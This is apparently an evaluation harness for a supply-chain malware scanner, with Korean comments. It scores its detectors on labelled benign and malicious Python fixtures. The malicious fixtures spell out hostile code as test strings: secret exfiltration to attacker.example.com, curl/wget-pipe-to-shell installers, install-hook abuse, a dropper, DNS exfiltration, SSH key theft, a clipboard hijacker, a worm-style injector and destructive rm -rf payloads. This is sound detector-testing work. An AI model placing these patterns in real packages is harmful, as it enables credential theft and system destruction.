"""
합성 fixture 기반 정량 평가.

목적:
  - 외부 데이터셋/네트워크 의존 없이 코어 매처들의 P/R/F1 측정
  - registry 다운로드 / threat_filter (known_malicious DB) 를 우회하고
    Stage 2 (behavior) → Stage 4C (47-indicator) → Stage 4D (taint slicing)
    → Stage 4E (sequence pattern) → Stage 5 (multi-agent stub) 의
    순수 매처 정확도만 측정

흐름:
  1. 인메모리 fixture (악성 N + 정상 N) 정의
  2. EntryFile/FullSourceFile 인스턴스로 stage 들 직접 호출
  3. verdict 별 분류 → 혼동 행렬 → P/R/F1
  4. JSON + 사람 읽는 표 출력

라벨 의미:
  - "malicious" 라벨: MALICIOUS / HIGH_RISK / SUSPICIOUS 중 하나로 잡혀야 정답
  - "benign"   라벨: CLEAN 으로 잡혀야 정답
"""
from __future__ import annotations

import json
import sys
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional

# src 경로 등록
ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "src"))

from pkgsentinel.schema import (
    AnalysisReport, AttackDimension, Ecosystem, Evidence, LLMVerdict,
    Severity, StageResult, TTPSource, Verdict, empty_report,
)
from pkgsentinel.stages.stage1_entry_point import EntryFile
from pkgsentinel.stages.stage1b_full_source import FullSourceFile
from pkgsentinel.stages.stage2_behavior import _analyze_python, BehaviorReport
from pkgsentinel.stages.stage4_ttp_match import match_ttps
from pkgsentinel.stages.indicator_matcher import match_all as match_47
from pkgsentinel.stages.sequence_patterns import mine as mine_seq
from pkgsentinel.stages.taint_slicer import analyze_python as taint_analyze
from pkgsentinel.stages.stage5_multi_agent import review_multi
from pkgsentinel.knowledge.malicious_indicators import IndicatorCategory


# ─────────────── Fixture ───────────────

@dataclass
class Fixture:
    name: str
    label: str                 # 'malicious' | 'benign'
    description: str
    files: dict[str, str]      # {path: content}
    expected_verdict_set: set  # 정답으로 인정할 verdict 집합
    note: str = ""


def _mal(name, *, expected, note, files, description=""):
    return Fixture(
        name=name, label="malicious", description=description,
        files=files,
        expected_verdict_set={Verdict(v) for v in expected},
        note=note,
    )


def _ben(name, *, files, description="", expected=("CLEAN",)):
    return Fixture(
        name=name, label="benign", description=description,
        files=files,
        expected_verdict_set={Verdict(v) for v in expected},
    )


# ─── 악성 fixtures (10개) ─────────────────────────────────

MAL_FIXTURES: list[Fixture] = [
    _mal(
        "credential-exfil-base64",
        description="env 읽기 → base64 → http.post (event-stream 류)",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="SP-001 + EXF-001",
        files={"setup.py": '''
"""Cred exfil sample"""
import os, base64, requests
def run():
    aws = os.environ.get("AWS_ACCESS_KEY_ID")
    gh  = os.environ.get("GITHUB_TOKEN")
    enc = base64.b64encode((aws + ":" + gh).encode())
    requests.post("https://attacker.example.com/c2", data=enc, verify=False)
'''},
    ),
    _mal(
        "encoded-exec-payload",
        description="base64 디코드 → exec (DEF-005)",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="SP-003 + DEF-005 + EXM-001",
        files={"hooks/postinstall.py": '''
import base64
payload = b"ZXhlYygncm0gLXJmIC8nKQ=="
exec(base64.b64decode(payload).decode())
'''},
    ),
    _mal(
        "shell-curl-bash-pipe",
        description="curl | bash 패턴 (NET-007)",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="EXM-008 + NET-007",
        files={"setup.py": '''
import subprocess
subprocess.run("curl http://attacker.example.com/x.sh | bash", shell=True)
'''},
    ),
    _mal(
        "system-recon-and-send",
        description="시스템 정보 다중 수집 → 송신 (SP-004)",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="SP-004 (recon + exfil)",
        files={"hooks/init.py": '''
import os, platform, socket, requests
data = {
    "user":   os.environ.get("USER"),
    "host":   socket.gethostname(),
    "uname":  platform.uname()._asdict(),
    "path":   os.environ.get("PATH"),
    "home":   os.environ.get("HOME"),
}
requests.post("https://x.example.com/info", json=data)
'''},
    ),
    _mal(
        "subprocess-output-upload",
        description="subprocess.check_output → http.put (taint flow)",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="taint: subprocess → upload",
        files={"agent.py": '''
import subprocess, requests
out = subprocess.check_output(["whoami"])
requests.put("https://x.com/upload", data=out)
'''},
    ),
    _mal(
        "obfuscated-import-exec",
        description="__import__ 난독화 + exec",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="DEF-006 + EXM-001",
        files={"util.py": '''
m = __import__("subprocess")
cmd = "rm -rf /"
m.run(cmd, shell=True)
'''},
    ),
    _mal(
        "discord-webhook-exfil",
        description="discord webhook 으로 secret 송신 (EXF-004)",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="EXF-004",
        files={"setup.py": '''
import os, requests
secret = os.environ.get("AWS_SECRET_ACCESS_KEY")
requests.post(
    "https://discord.com/api/webhooks/123/secret-token",
    json={"content": secret},
    timeout=5,
)
'''},
    ),
    _mal(
        "install-time-shell-execution",
        description="setuptools cmdclass 오버라이드 + install-time shell",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="EXS-002 + EXS-003 + EXM-008",
        files={"setup.py": '''
from setuptools import setup
from setuptools.command.install import install
import subprocess

class CustomInstall(install):
    def run(self):
        subprocess.run("wget http://evil.example.com/payload.sh -O - | sh", shell=True)
        install.run(self)

setup(
    name="evil-pkg",
    version="0.0.1",
    cmdclass={"install": CustomInstall},
)
'''},
    ),
    _mal(
        "ssl-verify-bypass-and-send",
        description="SSL 검증 우회 + 외부 송신 (NET-009)",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="NET-009 + EXF-001",
        files={"client.py": '''
import os, requests, urllib3
urllib3.disable_warnings()
data = {"key": os.environ.get("API_KEY")}
requests.post("https://attacker.example.com/c2",
              json=data, verify=False, timeout=5)
'''},
    ),
    _mal(
        "pickle-loads-untrusted",
        description="pickle.loads on remote download (EXM-005 / DEF-005 변형)",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="pickle RCE",
        files={"loader.py": '''
import pickle, requests
blob = requests.get("https://attacker.example.com/payload.pkl").content
obj = pickle.loads(blob)  # untrusted RCE
obj()
'''},
    ),
    # ─── 악성 fixture 추가 10개 (B 확장) ─────────────────
    _mal(
        "logic-bomb-platform-trigger",
        description="환경 분기 logic bomb (Linux 에서만 발화)",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="env-specific trigger",
        files={"trigger.py": '''
import platform, subprocess, os
if platform.system() == "Linux":
    aws = os.environ.get("AWS_ACCESS_KEY_ID")
    if aws:
        subprocess.run(f"curl -X POST -d {aws} https://attacker.example.com",
                       shell=True)
'''},
    ),
    _mal(
        "logic-bomb-time-trigger",
        description="시간 트리거 logic bomb",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="time-based trigger",
        files={"util.py": '''
import datetime, os, shutil
if datetime.datetime.now() > datetime.datetime(2026, 12, 31):
    shutil.rmtree(os.path.expanduser("~"))
'''},
    ),
    _mal(
        "dropper-binary-download-exec",
        description="binary 다운로드 + chmod + exec (dropper)",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="dropper",
        files={"dropper.py": '''
import os, requests, stat, subprocess
r = requests.get("http://evil.example.com/miner")
with open("/tmp/.cache_x", "wb") as f:
    f.write(r.content)
os.chmod("/tmp/.cache_x", stat.S_IRWXU)
subprocess.Popen(["/tmp/.cache_x"])
'''},
    ),
    _mal(
        "crypto-miner-pattern",
        description="암호화폐 채굴 패턴",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="crypto miner",
        files={"miner.py": '''
import subprocess, urllib.request
# Download miner config
urllib.request.urlretrieve(
    "https://pool.minexmr.com/config.json", "/tmp/cfg.json"
)
subprocess.Popen(
    ["xmrig", "-c", "/tmp/cfg.json", "--background"],
    stdout=subprocess.DEVNULL,
)
'''},
    ),
    _mal(
        "dns-exfiltration",
        description="DNS query 로 데이터 송출 (covert channel)",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="DNS exfil",
        files={"exfil.py": '''
import socket, os, base64
secret = os.environ.get("AWS_SECRET_ACCESS_KEY", "")
encoded = base64.b32encode(secret.encode()).decode().lower()
# 32자씩 split → DNS sub-domain 으로 송출
for chunk in [encoded[i:i+30] for i in range(0, len(encoded), 30)]:
    try:
        socket.gethostbyname(f"{chunk}.attacker.example.com")
    except Exception:
        pass
'''},
    ),
    _mal(
        "self-modifying-code",
        description="자기 자신을 다른 패키지에 주입하는 self-replication",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="worm-style",
        files={"worm.py": '''
import os, glob, shutil
self_path = __file__
# site-packages 의 __init__.py 들에 자기 자신 import 추가
for init in glob.glob("/usr/lib/python3/dist-packages/*/__init__.py"):
    with open(init, "a") as f:
        f.write("\\nimport sys; exec(open(r'%s').read())\\n" % self_path)
'''},
    ),
    _mal(
        "preinstall-script-style",
        description="install hook 안에서 외부 endpoint 호출 + secrets 송신",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="preinstall pattern",
        files={"setup.py": '''
from setuptools import setup
from setuptools.command.develop import develop
import os, requests

class CustomDevelop(develop):
    def run(self):
        try:
            requests.post(
                "https://attacker.example.com/preinstall",
                json={
                    "user":  os.environ.get("USER"),
                    "home":  os.environ.get("HOME"),
                    "cwd":   os.getcwd(),
                    "envs":  list(os.environ.keys()),
                },
                timeout=3,
            )
        except Exception:
            pass
        develop.run(self)

setup(name="evil-dev", cmdclass={"develop": CustomDevelop})
'''},
    ),
    _mal(
        "clipboard-hijack",
        description="클립보드 모니터링 + 암호화폐 주소 swap",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="clipboard hijack",
        files={"hijack.py": '''
import re, time, subprocess

def get_clip():
    return subprocess.check_output(["xclip", "-o"], text=True)

def set_clip(s: str):
    subprocess.run(["xclip", "-i"], input=s, text=True)

while True:
    try:
        c = get_clip()
        # BTC address pattern → 공격자 주소로 swap
        if re.match(r"^[13][a-km-zA-HJ-NP-Z0-9]{25,34}$", c):
            set_clip("1AttackerWalletXXXXXXXXXXXXXXX")
    except Exception:
        pass
    time.sleep(1)
'''},
    ),
    _mal(
        "ssh-key-theft",
        description="SSH 개인키 읽기 + 외부 송신",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="creds-paths + EXF-001",
        files={"helper.py": '''
import os, requests
home = os.path.expanduser("~")
for fname in ("id_rsa", "id_ed25519", ".aws/credentials"):
    p = os.path.join(home, ".ssh" if "id_" in fname else "", fname)
    try:
        with open(p) as f:
            requests.post("https://attacker.example.com/keys",
                          data={"name": fname, "content": f.read()})
    except Exception:
        pass
'''},
    ),
    _mal(
        "variable-alias-obfuscation",
        description="__import__ 결과를 변수에 할당 후 메서드 호출 (alias)",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="alias of obfuscated-import-exec — 변수 추적 한계 알려진 케이스",
        files={"alias.py": '''
import os
m = __import__("subprocess")
n = __import__("os")
secret = n.environ.get("AWS_KEY")
m.run(f"curl -d {secret} https://attacker.example.com", shell=True)
'''},
    ),
]


# ─── 정상 fixtures (10개) ─────────────────────────────────

BEN_FIXTURES: list[Fixture] = [
    _ben(
        "json-helper",
        description="단순 json 파싱 helper",
        files={"util.py": '''
"""JSON parsing utilities."""
import json

def parse(s: str) -> dict:
    return json.loads(s)

def dumps(d: dict) -> str:
    return json.dumps(d, indent=2)
'''},
    ),
    _ben(
        "math-utils",
        description="수학 유틸 (외부 호출 없음)",
        files={"math_utils.py": '''
"""Pure math helpers."""
def factorial(n: int) -> int:
    if n <= 1:
        return 1
    return n * factorial(n - 1)

def gcd(a: int, b: int) -> int:
    while b:
        a, b = b, a % b
    return a
'''},
    ),
    _ben(
        "http-getter-readonly",
        description="단순 http GET 클라이언트 (인증/secrets 없음)",
        files={"client.py": '''
"""Simple read-only HTTP client (no exfiltration)."""
import requests

def fetch_json(url: str) -> dict:
    resp = requests.get(url, timeout=10)
    resp.raise_for_status()
    return resp.json()

def fetch_text(url: str, encoding: str = "utf-8") -> str:
    resp = requests.get(url, timeout=10)
    resp.encoding = encoding
    return resp.text
'''},
    ),
    _ben(
        "string-utils",
        description="순수 string 처리 (외부 호출 없음)",
        files={"strings.py": '''
"""String formatting utilities."""
def title_case(s: str) -> str:
    return " ".join(w.capitalize() for w in s.split())

def slugify(s: str) -> str:
    return "-".join(s.lower().split())
'''},
    ),
    _ben(
        "config-loader-yaml-safe",
        description="yaml.safe_load (RCE 없음)",
        files={"config.py": '''
"""YAML config loader (safe_load)."""
import yaml
from pathlib import Path

def load(path: str) -> dict:
    with open(path) as f:
        return yaml.safe_load(f)

def dump(d: dict, path: str) -> None:
    with open(path, "w") as f:
        yaml.safe_dump(d, f)
'''},
    ),
    _ben(
        "logger-setup",
        description="logging 설정 (외부 송신 없음)",
        files={"logger.py": '''
"""Standard logger setup."""
import logging
import sys

def get_logger(name: str, level: int = logging.INFO):
    logger = logging.getLogger(name)
    logger.setLevel(level)
    h = logging.StreamHandler(sys.stdout)
    h.setFormatter(logging.Formatter("%(asctime)s %(levelname)s %(message)s"))
    logger.addHandler(h)
    return logger
'''},
    ),
    _ben(
        "csv-reader",
        description="CSV 파일 읽기 (read-only)",
        files={"csv_reader.py": '''
"""Read CSV files into list of dicts."""
import csv

def read_dicts(path: str) -> list:
    with open(path, encoding="utf-8") as f:
        return list(csv.DictReader(f))
'''},
    ),
    _ben(
        "datetime-formatter",
        description="datetime 포맷팅 (외부 의존 없음)",
        files={"dt.py": '''
"""Datetime formatting helpers."""
from datetime import datetime, timezone

def now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()

def fmt(dt: datetime, pattern: str = "%Y-%m-%d") -> str:
    return dt.strftime(pattern)
'''},
    ),
    _ben(
        "url-builder",
        description="URL 빌드 helper (요청 안 함)",
        files={"urls.py": '''
"""URL construction helpers (no actual requests)."""
from urllib.parse import urlencode, urljoin

def build(base: str, path: str, params: dict | None = None) -> str:
    url = urljoin(base, path)
    if params:
        url = url + "?" + urlencode(params)
    return url
'''},
    ),
    _ben(
        "cli-arg-parser",
        description="argparse 기반 CLI",
        files={"cli.py": '''
"""Simple argparse CLI."""
import argparse

def main():
    p = argparse.ArgumentParser()
    p.add_argument("--input", required=True)
    p.add_argument("--output", default="out.txt")
    p.add_argument("--verbose", action="store_true")
    args = p.parse_args()
    print(f"Input: {args.input}, Output: {args.output}")

if __name__ == "__main__":
    main()
'''},
    ),
    # ─── 정상 fixture 추가 10개 (B 확장) ────────────────
    _ben(
        "flask-style-app",
        description="Flask 스타일 웹 앱 (정상)",
        files={"app.py": '''
"""Standard Flask-like web app."""
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route("/health")
def health():
    return jsonify({"status": "ok"})

@app.route("/echo", methods=["POST"])
def echo():
    return jsonify({"received": request.get_json()})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
'''},
    ),
    _ben(
        "sqlalchemy-orm",
        description="SQLAlchemy ORM 표준 사용",
        files={"models.py": '''
"""SQLAlchemy declarative models."""
from sqlalchemy import Column, Integer, String, create_engine
from sqlalchemy.orm import declarative_base, sessionmaker

Base = declarative_base()

class User(Base):
    __tablename__ = "users"
    id = Column(Integer, primary_key=True)
    name = Column(String(80), nullable=False)
    email = Column(String(120), unique=True)

engine = create_engine("sqlite:///app.db")
Session = sessionmaker(bind=engine)
'''},
    ),
    _ben(
        "pytest-plugin-style",
        description="pytest fixture/conftest 스타일",
        files={"conftest.py": '''
"""pytest fixtures."""
import pytest

@pytest.fixture
def sample_data():
    return {"a": 1, "b": 2, "c": [3, 4, 5]}

@pytest.fixture(scope="session")
def db_url(tmp_path_factory):
    path = tmp_path_factory.mktemp("data") / "test.db"
    return f"sqlite:///{path}"
'''},
    ),
    _ben(
        "click-cli-framework",
        description="Click 기반 CLI 정의",
        files={"cli.py": '''
"""Click CLI."""
import click

@click.group()
def main():
    """My tool."""

@main.command()
@click.option("--name", default="World")
def hello(name: str):
    click.echo(f"Hello, {name}!")

@main.command()
@click.argument("path", type=click.Path(exists=True))
def stat(path: str):
    import os
    click.echo(os.stat(path))
'''},
    ),
    _ben(
        "asyncio-helper",
        description="asyncio gather / sleep helper",
        files={"async_util.py": '''
"""asyncio helpers."""
import asyncio

async def parallel(*coros, max_concurrency: int = 10):
    sem = asyncio.Semaphore(max_concurrency)
    async def bound(c):
        async with sem:
            return await c
    return await asyncio.gather(*(bound(c) for c in coros))

async def with_timeout(coro, seconds: float):
    return await asyncio.wait_for(coro, timeout=seconds)
'''},
    ),
    _ben(
        "pydantic-style-validator",
        description="dataclass 기반 validator",
        files={"validators.py": '''
"""Validators using dataclasses."""
from dataclasses import dataclass, field
from typing import Optional

@dataclass
class Address:
    street: str
    city: str
    zip_code: str

    def __post_init__(self):
        if not self.zip_code.isdigit() or len(self.zip_code) != 5:
            raise ValueError(f"invalid zip: {self.zip_code}")

@dataclass
class Person:
    name: str
    age: int
    email: Optional[str] = None
    addresses: list = field(default_factory=list)
'''},
    ),
    _ben(
        "retry-decorator",
        description="exponential backoff retry decorator",
        files={"retry.py": '''
"""Retry with exponential backoff."""
import functools
import time

def retry(max_attempts: int = 3, base_delay: float = 1.0):
    def decorator(fn):
        @functools.wraps(fn)
        def wrapper(*args, **kwargs):
            last_exc = None
            for attempt in range(max_attempts):
                try:
                    return fn(*args, **kwargs)
                except Exception as e:
                    last_exc = e
                    time.sleep(base_delay * (2 ** attempt))
            raise last_exc
        return wrapper
    return decorator
'''},
    ),
    _ben(
        "memory-efficient-iterator",
        description="generator 기반 파일 라인 처리",
        files={"iterators.py": '''
"""Memory-efficient file iterators."""
from pathlib import Path

def iter_lines(path: str, encoding: str = "utf-8"):
    with open(path, encoding=encoding) as f:
        for line in f:
            yield line.rstrip("\\n")

def iter_chunks(path: str, chunk_size: int = 65536):
    with open(path, "rb") as f:
        while True:
            chunk = f.read(chunk_size)
            if not chunk:
                break
            yield chunk
'''},
    ),
    _ben(
        "hash-utility",
        description="sha256 / blake2 helper",
        files={"hashing.py": '''
"""Hashing utilities."""
import hashlib

def sha256_hex(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()

def blake2_hex(data: bytes, digest_size: int = 32) -> str:
    return hashlib.blake2b(data, digest_size=digest_size).hexdigest()

def file_sha256(path: str, chunk: int = 65536) -> str:
    h = hashlib.sha256()
    with open(path, "rb") as f:
        while True:
            b = f.read(chunk)
            if not b:
                break
            h.update(b)
    return h.hexdigest()
'''},
    ),
    _ben(
        "json-schema-validator",
        description="jsonschema 기반 validator (정상 사용)",
        files={"jsv.py": '''
"""JSON schema validation wrapper."""
import json
from typing import Any

def validate(data: Any, schema: dict) -> tuple[bool, list]:
    try:
        from jsonschema import validate as _v, ValidationError
    except ImportError:
        return False, ["jsonschema not installed"]
    try:
        _v(instance=data, schema=schema)
        return True, []
    except ValidationError as e:
        return False, [str(e)]

def load_schema(path: str) -> dict:
    with open(path, encoding="utf-8") as f:
        return json.load(f)
'''},
    ),
]


# ─────────────── 평가 흐름 ───────────────

@dataclass
class EvalResult:
    fixture: str
    label: str
    verdict: Verdict
    expected: bool                  # 라벨에 부합하는가
    severity_max: Optional[str] = None
    matchers: dict = field(default_factory=dict)  # 어느 매처가 잡았나
    elapsed_s: float = 0.0
    note: str = ""


def _files_to_full_source(fixture: Fixture) -> list[FullSourceFile]:
    out = []
    for path, content in fixture.files.items():
        out.append(FullSourceFile(
            path=path, basename=path.split("/")[-1],
            content=content, size=len(content),
            language="python", tier=1,
        ))
    return out


def _files_to_entry(fixture: Fixture) -> list[EntryFile]:
    return [
        EntryFile(
            path=p, basename=p.split("/")[-1],
            content=c, size=len(c), language="python",
        )
        for p, c in fixture.files.items()
    ]


def _evaluate(fixture: Fixture) -> EvalResult:
    t0 = time.time()
    entries = _files_to_entry(fixture)
    fulls = _files_to_full_source(fixture)

    # Stage 2 — behavior
    file_seqs = []
    for ef in entries:
        fs = _analyze_python(ef)
        file_seqs.append(fs)
    behavior = BehaviorReport(files=file_seqs)

    # Stage 4 — TTP match
    try:
        ttp_rep = match_ttps(behavior, top_k=3)
        ttp_hits = len(ttp_rep.matches)
    except Exception:
        ttp_hits = 0

    # Stage 4C — 47-indicator
    ind_rep = match_47(
        behavior_files=file_seqs,
        source_files=fulls,
        package_name=fixture.name,
        description=fixture.description,
        author="test",
        declared_deps=[],
    )
    ind_hits = len(ind_rep.hits)
    ind_high = ind_rep.high_severity_count

    # Stage 4D — taint
    taint_total = 0
    for ef in entries:
        if ef.language == "python":
            taint_total += len(taint_analyze(ef.content).flows)

    # Stage 4E — sequence
    seq_rep = mine_seq(behavior)
    seq_hits = len(seq_rep.matches)

    # Stage 5 — multi-agent (stub)
    primary_seq = file_seqs[0] if file_seqs else None
    if primary_seq is not None:
        consensus = review_multi(
            package=fixture.name, version="0.0.1", ecosystem="PyPI",
            file_seq=primary_seq, ttp_matches=[],
            code_snippet="\n".join(c for c in fixture.files.values())[:1000],
            description=fixture.description,
            declared_deps=[],
            taint_slice=None,
            mode="stub",
        )
        llm_verdict = consensus.verdict
    else:
        llm_verdict = LLMVerdict.BENIGN

    # ─── verdict 합성 (pipeline.py 의 _STANDALONE_WEAK_INDICATORS 정신과 동일하게 보수화) ───
    # 약한 단독 지표 (MET-001/004, EXM-001 단독, DEF-003 단독 등) 는 SUSPICIOUS 트리거에서 제외
    high_sev_seq = sum(
        1 for m in seq_rep.matches if m.pattern.severity == Severity.HIGH
    )
    medium_sev_seq = sum(
        1 for m in seq_rep.matches if m.pattern.severity == Severity.MEDIUM
    )

    # MALICIOUS triggers
    if (
        llm_verdict == LLMVerdict.MALICIOUS
        and (ind_high >= 2 or high_sev_seq >= 1)
    ):
        verdict = Verdict.MALICIOUS
    # HIGH_RISK triggers: HIGH severity 다수
    elif (
        ind_high >= 2 or high_sev_seq >= 2
        or (ind_high >= 1 and high_sev_seq >= 1)
    ):
        verdict = Verdict.HIGH_RISK
    # SUSPICIOUS triggers: 단일 약한 지표는 제외
    #   - ind_high >= 1 (HIGH severity 단독)
    #   - seq_hits >= 1 (sequence pattern 매칭)
    #   - taint_total >= 1 (taint flow 발견)
    #   - ind_hits >= 3 (약한 지표가 다수 모임 — 누적 신호)
    #   - LLM=MALICIOUS 단독 (multi-agent 의 강한 신호)
    elif (
        ind_high >= 1
        or high_sev_seq >= 1
        or seq_hits >= 2
        or taint_total >= 1
        or ind_hits >= 3
        or llm_verdict == LLMVerdict.MALICIOUS
    ):
        verdict = Verdict.SUSPICIOUS
    else:
        verdict = Verdict.CLEAN

    expected = verdict in fixture.expected_verdict_set
    return EvalResult(
        fixture=fixture.name,
        label=fixture.label,
        verdict=verdict,
        expected=expected,
        severity_max=("HIGH" if ind_high >= 1 or high_sev_seq >= 1
                      else "MEDIUM" if ind_hits >= 1 or medium_sev_seq >= 1
                      else "LOW" if seq_hits >= 1 or taint_total >= 1
                      else "NONE"),
        matchers={
            "ttp_match": ttp_hits,
            "ind_47": ind_hits,
            "ind_47_high": ind_high,
            "seq_pattern": seq_hits,
            "seq_high": high_sev_seq,
            "taint_flows": taint_total,
            "llm_stub": llm_verdict.value,
        },
        elapsed_s=round(time.time() - t0, 2),
        note=fixture.note,
    )


# ─────────────── 집계 ───────────────

def _confusion(results: list[EvalResult]) -> dict:
    tp = fp = tn = fn = 0
    for r in results:
        is_mal_pred = r.verdict in (Verdict.MALICIOUS, Verdict.HIGH_RISK,
                                    Verdict.SUSPICIOUS)
        is_mal_true = (r.label == "malicious")
        if is_mal_true and is_mal_pred:
            tp += 1
        elif is_mal_true and not is_mal_pred:
            fn += 1
        elif (not is_mal_true) and is_mal_pred:
            fp += 1
        else:
            tn += 1
    p = tp / (tp + fp) if (tp + fp) else 0.0
    r = tp / (tp + fn) if (tp + fn) else 0.0
    f1 = (2 * p * r / (p + r)) if (p + r) else 0.0
    acc = (tp + tn) / max(1, len(results))
    return {
        "tp": tp, "tn": tn, "fp": fp, "fn": fn,
        "precision": round(p, 4),
        "recall": round(r, 4),
        "f1": round(f1, 4),
        "accuracy": round(acc, 4),
    }


# ─────────────── 출력 ───────────────

def _print_table(results: list[EvalResult]):
    print(f"{'fixture':<40} {'label':<10} {'verdict':<11} "
          f"{'OK?':<4} {'sev':<7} {'matchers'}")
    print("-" * 130)
    for r in results:
        ok = "OK" if r.expected else "FAIL"
        m = (f"ind={r.matchers['ind_47']}({r.matchers['ind_47_high']}H) "
             f"seq={r.matchers['seq_pattern']}({r.matchers['seq_high']}H) "
             f"taint={r.matchers['taint_flows']} "
             f"llm={r.matchers['llm_stub'][:4]}")
        print(f"{r.fixture:<40} {r.label:<10} {r.verdict.value:<11} "
              f"{ok:<4} {r.severity_max:<7} {m}")


def main():
    fixtures = MAL_FIXTURES + BEN_FIXTURES
    print(f"Total fixtures: {len(fixtures)} "
          f"(malicious={len(MAL_FIXTURES)}, benign={len(BEN_FIXTURES)})\n")

    results = []
    t0 = time.time()
    for f in fixtures:
        try:
            r = _evaluate(f)
        except Exception as e:
            import traceback
            traceback.print_exc()
            r = EvalResult(
                fixture=f.name, label=f.label, verdict=Verdict.ERROR,
                expected=False, note=f"ERROR: {e}",
            )
        results.append(r)

    elapsed = time.time() - t0
    print()
    _print_table(results)
    print()

    cm = _confusion(results)
    print("=== Confusion Matrix ===")
    print(f"  TP: {cm['tp']:>3}   FN: {cm['fn']:>3}")
    print(f"  FP: {cm['fp']:>3}   TN: {cm['tn']:>3}")
    print()
    print("=== Metrics ===")
    print(f"  Precision : {cm['precision']:.4f}")
    print(f"  Recall    : {cm['recall']:.4f}")
    print(f"  F1        : {cm['f1']:.4f}")
    print(f"  Accuracy  : {cm['accuracy']:.4f}")
    print(f"  Elapsed   : {elapsed:.2f}s "
          f"({elapsed*1000/len(results):.0f} ms/fixture)")

    # JSON 결과 저장
    out_path = ROOT / "scripts" / "eval_synthetic_results.json"
    out_path.write_text(json.dumps({
        "fixtures": [
            {
                "name": r.fixture, "label": r.label,
                "verdict": r.verdict.value, "expected": r.expected,
                "severity_max": r.severity_max,
                "matchers": r.matchers,
                "elapsed_s": r.elapsed_s, "note": r.note,
            }
            for r in results
        ],
        "metrics": cm,
        "elapsed_total_s": round(elapsed, 2),
    }, indent=2, ensure_ascii=False), encoding="utf-8")
    print(f"\nJSON saved -> {out_path}")

    # exit code: 라벨 일치 90% 이상 = 0
    pass_rate = sum(1 for r in results if r.expected) / len(results)
    sys.exit(0 if pass_rate >= 0.9 else 1)


if __name__ == "__main__":
    main()
